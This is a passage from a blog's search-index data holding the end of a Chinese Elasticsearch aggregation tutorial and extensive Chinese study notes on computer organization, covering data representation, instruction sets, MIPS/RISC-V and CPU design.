handleResponse(response); } 数据聚合 对文档数据进行统计、分析\n桶：对文档做而非女足 度量 Metric：计算某些特定值 管道 Pipeline：以其他聚合的结果为基础做聚合 DSL aggs 定义聚合\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET /items/_search { \u0026#34;query\u0026#34;: {\u0026#34;match_all\u0026#34;: {}}, // 可以省略 \u0026#34;size\u0026#34;: 0, // 设置size为0，结果中不包含文档，只包含聚合结果 \u0026#34;aggs\u0026#34;: { // 定义聚合 \u0026#34;cateAgg\u0026#34;: { // 给聚合起个名字 \u0026#34;terms\u0026#34;: { // 聚合的类型，按照品牌值聚合，所以选择term \u0026#34;field\u0026#34;: \u0026#34;category\u0026#34;, // 参与聚合的字段 \u0026#34;size\u0026#34;: 20 // 希望获取的聚合结果数量 } } } } RestClient 构造聚合 指定名称、类型、字段\n1 2 3 4 5 6 7 request.source().size(0); request.source().aggregation( AggregationBuilders .terms(\u0026#34;brand_agg\u0026#34;) .field(\u0026#34;brand\u0026#34;) .size(20) ); ","date":"2025-10-04T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-elasticsearch/","title":"ElasticSearch"},{"content":" 第一章 计算机系统概述 计算机系统的发展 计算机系统 = 硬件 + 软件\n软件 系统软件：用来管理整个计算机系统\n应用软件：按任务需要编制成的程序\n硬件 第一台电子数字计算机：ENIAC\n逻辑元件（用于处理电信号的最小单元）：电子管\n十进制表示，手动编程\n无冯 · 诺伊曼结构\n第二代：晶体管\n元器件：逻辑元件（晶体管），内存（磁芯），外存（磁鼓，磁带） 特点：变址，浮点运算，多路存储器，I/O 处理机，中央交换结构（非总线）。 软件：使用高级语言，提供系统软件。 第三代：中小规模集成电路\n元器件：逻辑元件和主存储器均由集成电路实现。 特点：微程序控制，Cache，虚拟存储器，流水线。 代表机种：IBM 360（大型机），DEC PDP-8（小型机），巨型机。 IBM 360（兼容机）\n相同/相似的指令集\u0026amp;操作系统。\n好处： 原来机器上的程序可以不改动而在新机器上运行，但性能不同。\n保持兼容的关键：低端机指令集是高端机的一个子集，称为“向后兼容”。\nDEC PDP-8（采用总线结构）\n总线结构好处：可扩充性好（允许将新的符合标准的模块插入总线，形成各种配置），节省器件，体积小，价格便宜\n第四代：大规模、超大规模集成电路\n半导体存储器，微处理器发展迅速。 特点：共享存储器，分布式存储器以及大规模并行系统。 组成 冯诺依曼结构模型 冯诺依曼提出存储程序，取代手动接线。\n冯诺依曼结构：\n计算机由运算器，控制器，存储器，输入设备和输出设备五个基本部件组成。 各基本部件功能： 存储器不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令； 控制器应能自动执行指令； 运算器应能进行加/减/乘/除四种基本算术运算，并且也能进行一些逻辑运算和附加运算； 操作人员可以通过输入设备和输出设备与主机进行通信。 内部以二进制数表述指令和数据 每条指令由操作码和地址码两部分组成。操作码指出操作的类型，地址码指出操作数的地址。 由一串指令组成程序。 采用存储程序工作方式 将事先编好的程序和原始数据送入主存中；启动执行后，在不需操作人员干预下，自动完成逐条取出指令和执行指令的任务。 基本部件及其功能 运算器（数据运算）：ALU、GPRs、标志寄存器等。 存储器（数据存储）：存储阵列、地址译码器、读写控制电路 总线（数据传送）：数据线（MDR）、地址线（MAR）和控制线 控制器（控制）：对指令译码生成控制信号 CPU = 运算器 + 控制器\n主机 = CPU + 主存\n各硬件工作原理 主存储器 主存储器 = 存储体 + MAR + MDR\nMemory Address Register 存储地址寄存器：指示位置，位数反应存储单元的个数 Memory Data Register 存储数据寄存器：指示存入、取出的具体数据（包括指令） 存储体：数据、指令在存储体内按地址存储，每个存储单元对应一个地址 1B = 1 byte ; 1 b = 1 bit\nMAR、MDR 逻辑上属于主存，但被集成到 CPU\n运算器 实现算数运算、逻辑运算\n运算器 = ACC + ALU + MQ + X\nAccumulator：累加器，存放操作数或运算结果 Multiple-Quotient Register：乘商寄存器，乘除运算时，存放操作数或运算结果 Arithmetic and Logic Unit：算数逻辑单元，通过复杂电路实现算数运算、逻辑运算 X：通用的操作数寄存器，用于存放操作数 控制器 控制器 = CU + IR +PC\nControl Unit:控制单元，分析指令，给出控制信号\nInstruction Register:指令寄存器，存放当前执行的指令\nProgram Counter:程序计数器，存放下一条指令地址，有自动加1功能\n配合 指令和数据 程序启动前，指令和数据都存储在存储器中，形式上没有区别，都是 0/1 序列。 采用存储程序的工作方式，程序由指令组成，启动后计算机自动取出一条条指令并执行，无需人的干预。 指令执行过程中，指令和数据从存储器取到 CPU，指令存在 IR 中，数据在 GPR 中。 指令需要给出的信息 操作码：指令的操作，加减法等 一个或多个源操作数：立即数、寄存器编号、存储地址 目的操作数地址：寄存器编号、存储地址 执行过程 程序执行前 数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放。指令由 OP、ADDR 字段组成，程序起始地址送入 PC。 开始执行程序 根据 PC 取指令送 IR：PC -\u0026gt; MAR -\u0026gt;存储器 -\u0026gt; MDR -\u0026gt; IR 指令译码：IR -\u0026gt; 控制器，控制器译码 取操作数：GPRs 或存储器 -\u0026gt; ALU 执行指令操作：ALU 运算 回写结果到 GPRs 或存储器 修改 PC 的值，使其指向下一条指令 重复上述步骤直到程序完成 软件 系统软件——简化编程，使硬件资源被有效利用 操作系统：硬件资源管理，用户接口 语言处理程序：翻译程序，Linker，Debug\u0026hellip; 翻译程序 汇编器（Assembler）：汇编语言源程序-\u0026gt;机器目标程序。或许叫汇编器更好理解？ 编译器（Complier）：高级语言程序-\u0026gt;汇编/机器目标程序。或许叫编译器更好理解？ 解释器（Interpreter）：将高级语言程序语句逐条翻译成机器指令并执行，不生成目标文件。（跳过汇编阶段） 其他实用程序：磁盘碎片整理、备份程序\u0026hellip; 机器语言：二进制代码\n汇编语言：助记符\n高级语言：C、C++、……\n应用软件——解决具体的应用问题 层次结构 语言层次 微指令系统：直接控制硬件执行 机器语言：传统机器M1，执行二进制机器指令 操作系统机器\n汇编语言：虚拟机器M2，用汇编语言翻译成机器语言\n高级语言：虚拟机器M3，需要编译成汇编、机器语言\n上两层视为硬件层\n计算机体系结构：讨论如何设计硬件与软件之间的接口\n计算机组成原理：讨论如何用硬件实现接口\nISA 指令集体系结构，其作为规约，规定了如何使用硬件。\n可执行的指令集合，包括指令格式、操作种类以及对应操作数的规定。 可以接受的操作数类型。 操作数存放的寄存器组结构，例如寄存器名称、编号、长度和用途。 操作数存放的存储空间的大小和编址方式。 操作数在存储空间中按大/小端方式存放。 指令获得操作数的方式，即寻址方式。 指令执行过程的控制方式，例如程序计数器，条件码定义等。 ISA 是计算机系统中必不可少的抽象层。\n性能指标 存储器 总容量 = 存储单元个数 * 存储字长(bit)\nCPU 基本概念 主频：CPU内数字脉冲信号振荡的频率\n= 1 / 时钟周期 CPI：执行一条指令需要多少个时钟周期（不同指令，CPI不同）\nCPU执行时间：执行整个程序的耗时 = (条数 * CPI) / 主频\nIPS：每秒执行多少个命令 = 主频 / 平均CPI\nFLOPS：每秒执行多少次浮点运算\nK=Kilo=千=10^3\nM=Million=百万=10^6\nG=Giga=十亿=10^9\nT=Tera=万亿=10^12\n数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）\n吞吐量：单位时间内处理请求的数量\n相应时间：CPU时间 + 等待时间\n基准程序：用于测量的程序\nMIPS（Million Instructions Per Second）：每秒执行多少百万条指令，着重点在于单条指令。\nMIPS 为平均值，其并没有考虑以上三个属性，并且由于：\n不同机器指令集不同 程序由不同指令混合而成 指令的频率会动态变换 厂家给出峰值 MIPS 因此，MIPS 表示性能存在局限性。\nMFLOPS：每秒执行浮点运算多少百万次，着重在于浮点操作本身。\n计算 CPU 执行时间=CPI×程序总指令条数×时钟周期\n第二章 数据的机器级表示 信息二进制编码 计算机内部数据：二进制表示\n机器级数据：\n数值数据，无符号/带符号整数，浮点数，十进制数 非数值数据，逻辑数，汉字 二进制编码原因：\n制造两个稳态的物理器件容易 二进制编码、计数、运算规则简单。 与逻辑命题对应，便于逻辑运算，方便地用逻辑电路实现算术运算。 机器数：0/1 编码的 0/1 内部 0/1 序列。\n真值：机器数真正的值\n数值数据表示方法 三要素：\n进位计数制：十进制，二进制等转换。 定点浮点表示：定点整数/小数；浮点数（使用一个定点小数和一个定点整数表示） 编码：原码补码反码等。 若不知道三要素，那么便无法得知机器数的具体真值。\n进制转换：\n二进制 -\u0026gt; 其他：划分位数，对应 十六、八 -\u0026gt; 二：位数对应，补全 十进制 -\u0026gt; 任意位数：求商取余 定点数的表示 常规计数，小数点位置固定。整数、小数分开存储。\n无符号数：没有符号位\n原码：\n有 +0、-0 两种表示形式 反码：\n正数与原码相同 若符号位为1，则数值位全部取反 依然有 +0、-0 补码：\n将减法抓换为等价的加法（加上补数） = 原码除符号位外，取反后加一（即反码 + 1） 移码： 将每一个数值加上一个偏置常数（ bias）\n一般来说，当编码位数为 n **时，bias 取 2^n 标准移码\n为什么要用移码来表示阶码？\n便于浮点数加减运算时的对阶操作（比较大小）\n与补码的关系：最高位相反，其余位相同\nC语言的解析 无符号数变为有符号：不改变数据内容，改变解释方式\n长变短：高位截断，保留地位\n短变长：符号扩展\n负数补1，正数补0 IEEE编码 规定了二进制浮点数算数标准，类似科学计数法简化计数\n二进制浮点数 符号：决定数值的正负性\n尾数：影响数值的精度。尾数的位数越多，精度越高\n阶码：反映小数点的实际位置\n基数：K进制通常默认基数为K\n规格化：石确保尾数的最高位非0数位刚好在小数点之前\nfloat型：32位单精度\n符号 + 阶码 + 尾数：1 + 8 + 23 double型：64位双精度\n符号 + 阶码 + 尾数：1 + 11 + 52 float单精度 默认存储规格化尾数，小数点前的1省略（隐含）\n基数规定为 2\n阶码用移码表示，规定偏置值为 127\n如何将十进制真值转换为偏置值为M的移码？\n将十进制真值+偏置值\n按“无符号整数”规则转换为指定位数\ndouble双精度 偏置值为1023 表示范围 特殊状态 阶码全 0，或阶码全 1\n阶码真值的取值范围为 -126 ~ 127（单精度） 根据数轴，存在：\n正上溢、正下溢、负上溢，负下移 上溢置为无穷，下溢置为0 数据表示 十进制数表示 ASCII 码：就是把数字当作字符存储，0-9用30H-39H表示\n前分隔：正号用 2B 负号用 2D 放在最前面 后嵌入：将符号嵌入最低位数字的 ASCII 码高 4 位中。 正数不变；负数高 4 位变为 0111。 BCD 码\n每 1 位十进制数用 4 位二进制表示。而 4 位二进制数可组合成 16 种状态，只需要选 10 种状态来表示十进制数。 西文字符表示： 复习要点中未提到\n十进制数字：0/1/2…/9 10 个 英文字母：A/B/…/Z/a/b/…/z 52 个 专用符号：+/-/%/*/\u0026amp;/…… 33 个 控制字符（不可打印或显示） 33 个 汉字表示 输入码：用于输入汉字。 内码：用于在系统中进行存储、查找、传送等处理 字模点阵或轮廓描述：用于显示/打印 数据的宽度 bit 字节： 现代计算机中，存储器按字节编址 字节是最小可寻址单位 （addressable unit ） LSB 表示最低有效字节，MSB 表示最高有效字节 字 表示被处理信息的单位，用来度量数据类型的宽度 字长 指某特定机器定点运算时数据通路的宽度。 数据通路： CPU 内部进行数据运算、存储和传送的路径以及路径上的部件。 等于 CPU 内部总线的宽度，或运算器的位数，或通用寄存器的宽度。 数据的存储和排列顺序 大小端 小端（ Little Endian）:低字节放低地址 大端（ Big Endian）:高字节放低地址 指令中，操作码和寄存器号的存放顺序不变，只需要考虑立即数的顺序 对齐：要求数据存放的地址必须是相应的边界地址 每次访存只能读写一个字 浪费一定空间，换取存取时间 数据的检错与纠错 大多采用“冗余校验”思想，即除原数据信息外，还增加若干位编码，这些新增的代码被称为校验位。\n奇偶校验码 海明校验码 循环冗余校验码 第三章 运算方法和运算部件 加法器 串行进位 传递速度慢\n并行进位 用先行进位优化，各进位之间无等待，相互独立并同时产生\n但全先行电路复杂，成本高\n局部先行进位加法器： 组内并行、组间串行\n用多个位数较少的 n 位全先行进位加法器进行串联 多级先行进位加法器： 组内并行、组间并行\nALU的构成 ALU 如何控制实现加、减、与、或等等各种功能； 无符号整数和带符号整数的加、减运算电路完全一样，这个运算电路称为整数加/减运算部件。 在整数加/减运算部件基础上，加上寄存器、移位器以及控制逻辑，就可实现 ALU、乘/除运算以及浮点运算。 ALU 的 OF、SF、CF 和 ZF 标志信息如何产生。 零标志 ZF、溢出标志 OF、进/借位标志 CF、符号标志 SF 称为条件标志。 条件标志（Flag）在运算电路中产生，被记录到专门的寄存器中 存放标志的寄存器通常称为程序/状态字寄存器或标志寄存器。 溢出条件：\n无符号加、减溢出条件：CF=1 带符号加、减溢出条件：OF=1 定点数运算 移位 逻辑移位\n针对无符号数\n左移 n 位，即乘上位权的 n 次方。\n高位溢出丢弃，低位补 0\n算数移位\n左移与逻辑移位类似，但移到符号位结果更改 右移：低位移出丢弃，但高位补符号位，若移出 1，则发生精度丢失 加减 原码\n减法用减法器实现，1 变 0 补码\n符号位可以一起参与运算 [A+B]补=[A]补+ [B]补 [A-B]补=[A]补+[-B]补 [-B] 补 = [B] 补的 “取反加 1”，符号位也参与取反\n溢出判断：上溢正变负；只有可能同号运算出现；判断是否在合法表示范围内即可 乘法 无符号整数： 模拟手算乘法即可，计算机还需拆分部分积 具体实现：\n带符号整数 给无符号整数乘法电路添加一辅助位，让符号位参与运算。\n计算机底层判断溢出：\n若 2n 位的高 n + 1 位不均相同，则溢出 实现方式 ALU + 移位器 + 寄存器 + 控制逻辑 阵列乘法器 逻辑运算模拟 浮点数运算 浮点数加减运算的对阶原则和方法；\n原则：小阶向大阶看齐\n方法：阶小的那个数的尾数右移，右移位数等于两个阶码差的绝对值\nIEEE 754 尾数右移时，要将隐含的“1”移到小数部分，高位补 0，移出的低位保留到特定的“附加位”上\n如何计算移码表示的阶码的和与差（标准移码与 IEEE754 移码有什么差别）；\n阶码加法公式为： Eb ← Ex + Ey + 129 （ mod 2^8）\n阶码减法公式为： Eb ← Ex + [–Ey]补 + 127 （ mod 2^8）\n如何计算一个移码数减 1\n尾数规格化中的右规和左规方法；\n当尾数高位为 0，则需左规：尾数左移一次，阶码减 1，直到 MSB 为 1 每次阶码减 1 后要判断阶码是否下溢 先判断阶码是否为全 0，若是，则直接置阶码下溢；否则，阶码减 1 后判断阶码是否为全 0，若是，则阶码下溢。 当尾数最高位有进位，需右规：尾数右移一位，阶码加 1，直到 MSB 为 1 每次阶码加 1 后要判断阶码是否上溢 先判断阶码是否为全 1，若是，则直接置阶码上溢；否则，阶码加 1 后判断阶码是否为全 1，若是，则阶码上溢。 阶码溢出异常处理： 阶码上溢，则结果溢出； 阶码下溢，则结果为 0 乘法运算结果不需左规！最多右规 1 次！ 除法最多左规 1 次！不需右规！ 尾数的舍入处理常用方法；\n就近舍入：舍入为最近可表示的数 若为非中间值：LSB 后 1 位 0 舍 1 入 若为中间值：强迫结果为偶数， LSB= 1.1101110 → 1.1110 (1.1101110 → 1.1110, 110\u0026gt;100, 1.1101+0.0001 = 1.1110) 1.1101011 → 1.1101 (1.1101011 → 1.1101, 011\u0026lt;100, 1.1101+ 0 = 1.1101) 1.1101101 → 1.1110 1.1111100 → 10.0000 (1.1111100 → 10.0000, 100=100, 1.1111+0.0001 = 10.0000) 朝+∞方向舍入：舍入为右边最近可表示数 （正向舍入） 例：-1.1101101 →-1.1101 ； 1.1101101 →1.1110 朝-∞方向舍入：舍入为左边最近可表示数 （负向舍入） 例：-1.1101101 →-1.1110 ； 1.1101101 →1.1101 朝 0 方向舍入：直接截取所需位，后面的位丢弃。这种方法最简单 如何判断结果溢出（上溢和下溢）。\n第四章 指令格式 指令：是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。\n根据地址码数不同 零地址指令： 不需要操作数，如停机、关中断等 堆栈计算机，操作数隐藏在栈顶 一地址指令： 只需单操作数，如加一、取反 需两个操作数，但其中一个存储在某个寄存器内 二地址指令： 用于需要两个操作数的算术运算 三地址指令： 多一个地址存储结果 四地址指令： 再多一个地址存储下一个指令地址 指令位数不变时，地址码数越多，寻址能力越差\n按指令长度分类 指令字长：一条指令的总长度(可能会变)\n影响取指令所需时间\n机器字长：CPU进行一次整数运算所能处理的二进制数据的位数(通常和ALU直接相关)\n存储字长：一个存储单元中的二进制代码位数（通常和MDR位数相同)\n按操作码长度分类 定长：译码电路设计简单，但复杂性低\n按操作类型分类 数据传送\nLOAD：把存储器中的数据放到寄存器中\nSTORE： 把寄存器中的数据放到存储器中\n算数逻辑操作\n算数、逻辑（与或非、位操作） 移位操作\n算数、逻辑、循环移位 转移操作（改变程序执行流，PC指针改变）\n无条件转移 JMP\n条件转移JZ：结果为0；JO：结果溢出；JC：结果有进位\n调用和返回 CALL和RETURN\n陷阱(Trap)与陷阱指令\n输入输出操作\nCPU寄存器与IO端口之间的数据传送(端口即IO接口中的寄存器) 设计 指令格式的选择应遵循的几条基本原则 应尽量短 要有足够的操作码位数 指令编码必须有唯一的解释，否则是不合法的指令 指令字长应是字节的整数倍 合理地选择地址字段的个数 指令尽量规整 一条指令必须明显或隐含包含以下信息： 操作码：指定操作类型 源操作数或其地址：一个或多个源操作数所在的地址 结果的地址：产生的结果存放何处（目的操作数） 下一条指令地址：下条指令存放何处 指令的寻址方式\u0026mdash;-简单 顺序执行：PC增值 跳转 （ jump / branch / call / return ）：同操作数寻址 操作数的寻址方式\u0026mdash;-复杂 操作数来源：寄存器 / 主（虚）存 /外设端口 / 栈顶 操作数结构：位 / 字节 / 半字 / 字 / 双字 / 一维表 / 二维表 /… 通常寻址方式特指“操作数的寻址” 扩展操作码 格式：定长指令字结构 + 可边长操作码\n即不同地址数的指令使用不同的操作码，便于判断 通常情况下，对使用频率较高的指令，分配较短的操作码；对使用 频率较低的指令，分配较长的操作码，从而尽可能减少指令译码和 分析的时间。\n设地址长度为n，上一层留出m种状态，下一层可扩展出mx2^n种状态\n注意短的操作码不能是长操作码的前缀\n寻址方式 PC：程序计数器，取址后会自动加一\n指令寻址 确定下一条指令的存放地址，由 PC 指明\n顺序寻址：\nPC + ”1“ 1 理解为一个指令字长，根据指令字长变化字节编码 跳跃寻址\n执行转移指令导致 PC 值改变（直接修改） 数据寻址 确定本条指令的地址码指明的真实地址\n程序存储位置是相对的，需要用偏移量解读\n在地址码中划分出寻址特征，规定该地址需要用何种方式寻址\n直接寻址：存储 = 真实，即 EA = A\n间接寻址：存储的是真实值的地址，即 EA = （A）\n寄存器寻址：指令字中直接给出操作数所在寄存器编号\n寄存器间接寻址：寄存器存储的是操作数所在储存单元的地址，即 EA = （R）\n隐含寻址：非显示给出的操作数\n立即寻址：地址就是操作数本身，又称立即数\n基址寻址：以程序的起始存放地址作为起点，EA = （BR）+ A\nBR 为基址寄存器，由操作系统决定，不可更改\n变址寻址：程序员自己决定从哪里作为起点，EA = （IX）+ A IX 为变址寄存器，可由用户决定。类似一个指针，设置为数组首地址等\n相对寻址：程序计数器PC所指地址作为起点，EA = （PC）+ A\n堆栈寻址：操作数存放在堆栈中，隐含使用堆栈指针(SP)作为操作数地址。\n堆栈可以用寄存器实现（硬堆栈）或主存实现，硬堆栈不妨存，速度快\n优缺点 条件测试方式(?) 对于带符号数和无符号数运算，标志生成方式有没有不同？\n答：没有，因为加法电路不知道是无符号数还是带符号整数！\n指令系统设计风格 累加器型： （earliest machines） 特点：其中一个操作数（源操作数 1）和目的操作数总在累加器中 堆栈型： （e.g. HP calculator, Java virtual machines) 特点：总是将栈顶两个操作数进行运算，指令无需指定操作数地址 通用寄存器型： （e.g. IA-32, Motorola 68xxx) 特点：操作数可以是寄存器或存储器数据（即 A、B 和 C 可以是寄存器或存储单元） 装入/存储型： （e.g. SPARC, MIPS, PowerPC) 特点：运算指令的操作数只能是寄存器数据，只有 load/store 能访问存储器 指令集：CISC 和 RISC CISC（Complex Instruction Set Computer）：\n一条指令完成一个复杂的基本功能。 x86 架构 RISC（Reduced Instruction Set Computer）：\n一条指令完成一个基本“动作”；多条指令组合完成一个复杂的基本功能。\n电路简单，功耗小，寄存器多\n只有 LOAD、STORE 指令可以访存\nARM 架构，主要用于手机、平板\n在程序中各种指令出现的频率悬殊很大，最常使用的是一些简单指令，这些指令占程序的80%，但只占指令系统的20%。而且在微程序控制的计算机中，占指令总数20%的复杂指令占用了控制存储器容量的80%。\nMIPS 的指令格式 所有指令都是32位宽（字长），按字地址对齐存储，字地址为4的倍数\n分为 R、I、J 型\nR 型 参与运算的操作数和结果都在寄存器，R 型指令的寻址方式只有寄存器寻址一种； R 型指令的 op 全为 0，具体功能由 func 部分确定； rs：第一个源操作数（source register） rt：第 2 个源操作数（target register） rd：目的寄存器（destination register） shamt：对非移位指令为 00000。移位指令为移位次数。 I 型 指令中包含了一个立即数，所以称为 I 型指令。 op：确定指令的功能； rs：可以是一个源操作数，寄存器寻址；或者在存取指令中用作基址寄存器，偏移寻址。 rt：目的寄存器 Immediate：长度为 16 位的立即数，指令执行时需扩展为 32 位。根据指令的不同，可以有以下三种用法： 运算类指令（ori）：以立即寻址方式提供的一个源操作数。 存取指令（lw/sw）：作为偏移量，与寄存器 rs 组成偏移寻址方式，提供一个存储器操作数。 条件转移指令（bne）：作为偏移量，与 PC 寄存器组成相对寻址方式，提供一个转移目的地址。 J 型 op：确定指令的功能 address：转移地址 整合 三种指令 汇编格式 a=b op c 把=和op变成逗号 R型指令格式是op+rs+rt+rd+shamt+func 汇编格式是 xxx $rs, $rt, $rd I型指令格式是op+rs+rt+imm 汇编格式是 xxx $rt, $rs, imm J型指令格式是op+addr 汇编格式是 xxx addr MIPS 的通用寄存器 0 号寄存器$zero 为固定值零，不能改变 MIPS还提供了32个32位的单精度浮点寄存器$f0∽$f31,用于浮点数指令。它们可配对成16个64位的双精度浮点寄存器。 在汇编语言中使用寄存器时可以用寄存器名，也可以用寄存器号，前面加上“$”,例如，$8或$t0。 寄存器 长度：32 位 个数：32 个 MIPS 的寻址方式 寄存器寻址 可以出现在 R 型和 I 型格式中 立即数寻址 偏移寻址 PC 相对寻址 PC\u0026lt;\u0026ndash; PC+4+imm*4 伪直接寻址 为什么称伪直接？ 最终地址：PC 高四位+addr+两个 0，+表示拼接 位数：4+26+2=32 机器语言的解码（反汇编）？ 高级语言、汇编语言、机器语言之间的转换 ？ RISC-V 指令系统 具有模块化结构，稳定性和可扩展性好，在简洁性、实现成本、功耗、性能和程序代码量等各方面具有显著优势。\n模块化结构：\n核心：RV32I + 标准扩展集：RV32M、RV32F、RV32D、RV32A = RV32G 32位架构RV32G = RV32IMAFD，其压缩指令集RV32C（指令长度16位） 64位架构RV64G = RV64IMAFD，其压缩指令集RV64C（指令长度16位） 向量计算RV32V和RV64V；嵌入式RV32E（RV32I的子集，16个通用寄存器） 指令格式 32位 R-型为寄存器操作数指令\nI-型为短立即数或装入（Load）指令\nS-型为存储（Store）指令\nB-型为条件跳转指令\nU-型为长立即数操作指令\nJ-型为无条件跳转指令\n16位压缩 第五章 中央处理器 CPU 的功能和基本结构 CPU 基本功能： 指令控制。完成取指令、分析指令和执行指令的操作，即程序的顺序控制。 操作控制。一条指令的功能往往是由若干操作信号的组合来实现的。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件从而控制这些部件按指令的要求进行动作。 时间控制。对各种操作加以时间上的控制。时间控制要为每条指令按时间顺序提供应有的控制信号。 数据加工。对数据进行算术和逻辑运算。 中断处理。对计算机运行过程中出现的异常情况和特殊请求进行处理。 基本结构 数据通路 + 控制器\n控制器 对指令进行译码，生成指令对应的控制信号，控制数据通路的动作。它向执行部件发出控制信号，是指令的控制部件。 数据通路 由操作元件和存储元件通过总线方式或分散方式连接而成的进行数据传送、处理和存储的路径。\n数据通路\n指令执行过程中，数据所经过的路径，以及路径上的部件。\n包括：ALU、通用寄存器、状态寄存器、MMU、cache、中断处理逻辑等\n数据通路中专门进行数据运算的部件称为执行部件或功能部件\n功能：进行数据传送、处理和存储\n组成元件\n组合逻辑元件（操作元件）：输出只取决于当前输入 时序逻辑元件（也称状态元件，或存储元件）：在时钟控制下输入被写到电路中，直到下个时钟到达。 定时方式：规定信号何时写入状态元件（上升沿、下降沿、电平触发） 存储元件：寄存器 \u0026ndash;\u0026gt; 寄存器组 连接方式\n总线、分散 时序控制（过去式）：\n现代时钟周期 …… + 状态元件 + 操作元件( 组合电路) + 状态元件 + …… 只有状态元件能存储信息，所有操作元件都从状态元件接收输入，并将输出写入状态元件中。 时钟周期= Latch Prop + Longest Delay Path + Setup + Clock Skew(时钟偏移) 约束条件：操作元件输出有效信号最快出现必须在下一级状态元件的输入保持时间之后出现 单周期 MIPS 处理器的设计 复习：三种指令类型 R、I、J\n设计处理器步骤 分析每条指令功能，并用 RTL（Register Transfer Language）来表示 根据指令的功能给出所需的元件，并考虑如何将他们互连 确定每个元件所需控制信号的取值 汇总所有指令所涉及到的控制信号，生成一张反映指令与控制信 号之间关系的表 根据表得到每个控制信号的逻辑表达式，据此设计控制器电路 设计数据通路 R-type：取指 \u0026ndash;\u0026gt; 取寄存器 \u0026ndash;\u0026gt; 运算 \u0026ndash;\u0026gt; 输出、计算下地址 M[PC] 从PC所指的内存单元中取指令 R[rd] ← R[rs] + R[rt] 从rs、r所指的寄存器中取数后相加。若结果不溢出，则将结果送rd所指的寄存器中；若结果溢出，则不送结果，并转到“溢出处理程序”执行。 PC ← PC + 4 PC加4，使PC指向下一条指令 I-type M[PC] 取指令（公共操作，取指部件完成） R[rt] ← R[rs] or ZeroExt(imm16) 立即数零扩展，并与rs内容做“或”运算 PC ← PC + 4 计算下地址（公共操作，取指部件完成） Lw 装入指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址 (立即数符号扩展！) R[rt] ← M [Addr]装入数据到寄存器rt中 PC ← PC + 4计算下地址（公共操作，取指部件完成） sw 指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址（符号扩展！） M[Addr] ← R[rt] 寄存器rt中的内容存到内存单元中 PC ← PC + 4 计算下地址（公共操作，取指部件完成） 分支指令 M[PC] 取指令（公共操作，取指部件完成） Cond ← R[rs] - R[rt] 做减法比较rs和rt中的内容 if (Cond eq 0) 计算下地址（根据比较结果，修改PC） PC ← PC + 4 + ( SignExt(imm16) x 4 ) else PC ← PC + 4 无条件跳转指令 M[PC]\t取指令（公共操作，取指部件完成） PC\u0026lt;31:2\u0026gt; ← PC\u0026lt;31:28\u0026gt; 串接 target\u0026lt;25:0\u0026gt; 计算目标地址 指令范围有多大？ 不是相对寻址，是绝对寻址。转移范围只能在 j 指令所在的228=256MB页面内，页面号与j指令相同 PC\u0026lt;31:28\u0026gt;\n完成 时间计算 设计控制器 方法： 根据每条指令的功能，分析控制信号的取值，并列表表示。 根据列出的指令和控制信号的关系，写出每个控制信号的逻辑表达式。 PPT 上看指令译码后条件码的产生、执行过程，内容较多\n设计逻辑 MIPS指令格式中指示操作性质有op 和 func两个字段，分别用来产生两类不同的控制信号 func只用于R型指令，形成对应的ALU的功能控制信号 op用来产生各种控制信号，包括了非R型指令的ALU功能控制信号 控制器 = 主控制单元 + ALU局部控制单元 单周期处理器的性能 CPI = 1；其他条件一定的情况下，CPI越小，则性能越好！ 除CPI外，还取决于时钟周期的宽度，单周期处理器的时钟宽度为最复杂指令的执行时间 但是，对每类指令采用可变长时钟周期实现非常困难，而且所带来的额外开销会很大，不合算 单周期处理器的问题 时钟周期以最复杂指令所需时间为准，太长 解决思路 把指令的执行分成多个阶段，每个阶段用一个时钟周期完成 多周期处理器 时钟周期短 不同指令所用周期数可以不同 允许功能部件在一条指令执行过程中被多次使用 微程序设计和异常处理 硬连线控制器的特点\n优点：速度快，适合于简单或规整的指令系统，例如 MIPS 指令集\n缺点：它是一个多输入/多输出的巨大逻辑网络。对于复杂指令系统来说，结构庞杂，不用大规模集成电路则实现困难；修改、维护不易；灵活性差。\n简化方法：微程序设计\n微程序控制器\n仿照程序设计的方法，编制每条指令对应的微程序 所有指令对应的微程序放在只读存储器（控制存储器）中，执行某条指令就是取出对应微程序中的各条微指令，对微指令译码产生对应的微命令(即控制信号) 特点：具有规整性、可维护性和灵活性，但速度慢 基本结构\n微指令格式\n水平型：相容微命令尽量多地安排在一条微指令中\n优点：微程序短，并行性高，适合于较高速度的场合 缺点：微指令长，编码空间利用率较低，并且编制困难 垂直型：一条微指令只控制一、二个微命令\n包含：若干微命令、下条微指令地址（可选）、常数（可选）\n异常和中断的处理 中断\n内部异常：在CPU内部发生的意外事件或特殊事件 故障（fault）：执行指令引起的异常事件，如溢出、缺页、堆栈溢出、访问超时等 自陷（Trap）：预先安排的事件，如单步跟踪、系统调用(执行访管指令)等 终止（Abort）：硬故障事件，此时机器将“终止”，调出中断服务程序来重启操作系统 外部中断：在CPU外部发生的特殊事件，通过向CPU发“中断请求”信号，请求CPU处理 处理机制\n关中断（“中断/异常允许”状态位清0）：使处理器处于“禁止中断”状态，以防止新异常(或中断)破坏断点、程序状态和现场（现场指通用寄存器的值）。 保护断点和程序状态：将断点和程序状态保存到堆栈或特殊寄存器中。 识别异常事件：有软件识别和硬件识别（向量中断方式）两种不同的方式。 软件识别（MIPS采用）：设置一个异常状态寄存器（MIPS中为Cause寄存器），用于记录异常原因。操作系统中有一个统一的异常处理程序，该程序按优先级顺序查询异常状态寄存器的各位，识别出异常事件 硬件识别（向量中断）：用专门的硬件查询电路按优先级顺序识别异常，得到“中断类型号” MIPS 异常处理数据通路设计\n增加以下两个寄存器 EPC：32位，用于存放断点（异常处理后返回到的指令的地址） Cause：32位，记录异常原因 增加两个寄存器的“写使能”控制信号 EPCWr：在保存断点时该信号有效，使断点PC写入EPC CauseWr：在处理器发现异常（如：非法指令、溢出）时，该信号有效，使异常类型被写到Cause寄存器 需要一个控制信号IntCause来选择正确的值写入到Cause中 